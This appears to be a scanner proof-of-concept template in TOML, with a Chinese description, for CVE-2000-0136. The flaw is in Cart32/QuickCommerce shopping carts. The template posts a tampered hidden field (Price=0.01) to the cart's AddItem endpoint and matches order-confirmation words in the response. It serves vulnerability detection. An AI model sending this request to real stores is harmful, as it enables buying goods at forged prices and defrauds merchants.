[info]
author = "AVE"
description = "通过 HTTP POST 请求发送篡改后的隐藏表单字段参数（如修改 Price 值），验证目标购物车程序是否在服务端校验商品价格等隐藏字段。若服务端未校验，攻击者可实现任意价格购买。参考 ExploitDB 19951 实际利用代码。"
id = "POC-AVE-2000-0406"
name = "Cart32 / QuickCommerce 等多款购物车程序隐藏表单字段漏洞 PoC"
severity = "high"
tags = ["cve-2000-0136"]
vuln_id = [
    "CVE-2000-0136",
    "AVE-2000-0406",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/cart32.exe/justsocks-AddItem"
protocol = "http"

[poc.requests.body]
content = "Price=0.01&Item=Test+Item&PartNo=F6092&Qty=1&p1=XL&t1=d-Size%3BS%3BM%3BL%3BXL&p2=Black&t2=d-Color%3BBlack%3BWhite"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
Referer = "{{BaseURL}}"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Thank you",
    "Order",
    "Confirmation",
    "successfully",
]
